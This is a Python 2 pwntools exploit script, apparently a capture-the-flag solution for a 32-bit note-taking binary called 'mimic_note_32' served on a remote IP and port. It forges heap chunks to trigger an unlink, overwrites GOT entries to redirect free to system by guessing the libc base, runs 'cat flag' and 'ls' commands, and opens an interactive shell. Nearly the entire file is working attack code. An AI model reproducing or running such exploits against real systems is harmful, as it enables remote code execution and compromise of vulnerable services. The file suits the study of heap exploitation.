#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

# for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
#     signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

# context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'error'
execve_file = './mimic_note_32'
execve_file = './mimic_note_32.bak'
# execve_file = './mimic_note_64'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
# sh = remote('172.17.0.2', 1000)
sh = remote('45.32.120.212', 6666)
# elf = ELF(execve_file)
# libc = ELF('./libc-2.23.so')
# libc = ELF('/glibc/glibc-2.23/debug_x64/lib/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $ptr = (char *)&notes
    define pr
        x/8gx $ptr+0x40
        end

    define prr
        x/8wx $ptr
        end

    b *0x8048470
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def New(size):
    sh.sendafter('>> ', '1'.ljust(31, '\0'))
    sh.sendafter('size?\n', str(size).ljust(31, '\0'))
    
def delete(index):
    sh.sendafter('>> ', '2'.ljust(31, '\0'))
    sh.sendafter('index ?\n', str(index).ljust(31, '\0'))

def show(index):
    sh.sendafter('>> ', '3'.ljust(31, '\0'))
    sh.sendafter('index ?\n', str(index).ljust(31, '\0'))

def edit(index, content):
    sh.sendafter('>> ', '4'.ljust(31, '\0'))
    sh.sendafter('index ?\n', str(index).ljust(31, '\0'))
    sh.sendafter('content?\n', content)

def exit():
    sh.sendafter('>> ', '5'.ljust(31, '\0'))

notes_x86 = 0x0804A060
notes_x64 = 0x6020A0

New(0xfc) # 0
New(0xfc)
New(0xfc)
New(0xfc)
New(0xfc)

libc_start = [
0xf7e37637,
0xf7d4c637,
0xf7e35637,
0xf7e22637,
0xf7ddb637,
0xf7d55637,
0xf7e31637,
0xf7d7a637,
0xf7e1e637,
0xf7da7637,
0xf7d90637,
0xf7e0f637,
0xf7e16637,
0xf7d39637,
0xf7e1a637,
0xf7e29637,
0xf7e0f637,
0xf7def637,
0xf7d40637,
0xf7db1637]

free_addr = random.choice(libc_start) + 0x58119

system_addr = free_addr - 0x35e10

# New(0xf8) # 4
# New(0xf8)
# New(0xf8)
# New(0xf8)

edit(1, (p32(0) + p32(0xf8 | 1) + p32(notes_x86 + 8 - 12) + p32(notes_x86 + 8 - 8)).ljust(0xf8, 'a') + p32(0xf8))

# edit(5, (p64(0) + p64(0xf1) + p64(notes_x64 + 0x50 - 0x18) + p64(notes_x64 + 0x50 - 0x10)).ljust(0xf0, 'b') + p64(0xf0))

# unlink
delete(2)
# delete(6)

str_addr = 0x804b000 - 0x10

# edit(1, p32(0) + p32(str_addr) + p8(0xfc))

edit(3, p32(free_addr) + '\0')
edit(1, p32(0) + p32(0x804A018) + p32(0xfc) + p32(notes_x86 + 8 * 8) + p32(0xfc) + p32(0) * 2 + p32(0x804A014) + p8(0xfc)) # null
edit(0, '\0')

context.log_level = 'debug'

show(3)
edit(3, p32(system_addr))
edit(4, 'cat flag 1>&2 && pwd 1>&2 && ls -l 1>&2 \0')

delete(4)

sh.interactive()
clear()
